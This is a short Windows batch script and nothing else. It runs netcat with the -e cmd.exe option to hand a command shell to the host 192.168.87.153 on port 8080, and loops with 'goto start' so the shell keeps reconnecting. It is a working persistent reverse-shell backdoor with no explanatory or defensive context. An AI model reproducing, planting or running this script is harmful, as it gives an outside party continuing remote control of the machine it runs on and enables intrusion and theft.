@echo off
cls
:start
cd C:\Program Files
nc.exe -nv 192.168.87.153 8080 -e cmd.exe
goto start